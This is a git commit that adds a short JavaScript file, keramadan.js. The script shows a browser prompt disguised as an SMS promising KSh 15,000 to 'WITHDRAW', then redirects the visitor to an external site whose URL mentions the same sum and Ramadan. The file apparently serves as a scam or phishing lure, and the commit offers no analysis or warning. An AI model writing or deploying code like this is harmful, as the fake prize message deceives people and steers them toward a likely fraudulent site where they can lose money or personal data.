f0c55131ea1d93410fb4f2405aeca7b7512b40fa
usorondo38 <milieux_13_ruse@icloud.com>
2026-03-04 12:15:53 +0100

    Create keramadan.js

---
+++ keramadan.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive KSh 15,000. kindly press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://www.ubonowo.site/ksh15000-joho-ramadan';
+}
